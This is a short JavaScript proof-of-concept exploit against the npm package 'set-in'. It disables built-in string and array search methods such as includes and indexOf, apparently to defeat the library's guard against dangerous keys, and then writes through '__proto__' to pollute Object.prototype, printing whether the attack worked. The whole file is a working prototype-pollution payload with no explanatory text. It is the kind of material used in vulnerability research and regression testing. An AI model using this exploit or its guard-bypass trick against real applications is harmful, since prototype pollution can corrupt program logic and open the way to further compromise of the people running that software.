String.prototype.includes = () => false;
String.prototype.startsWith = () => false;
String.prototype.endsWith = () => false;
String.prototype.indexOf = () => -1;
String.prototype.lastIndexOf = () => false;
String.prototype.match = () => false;
String.prototype.search = () => false;
String.prototype.matchAll = () => false;
Array.prototype.includes = () => false;
Array.prototype.indexOf = () => -1;
const si = require('set-in');
const obj = {};
console.log({}.polluted);
si(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log('{ ' + obj.polluted + ', ' + 'yes' + ' }');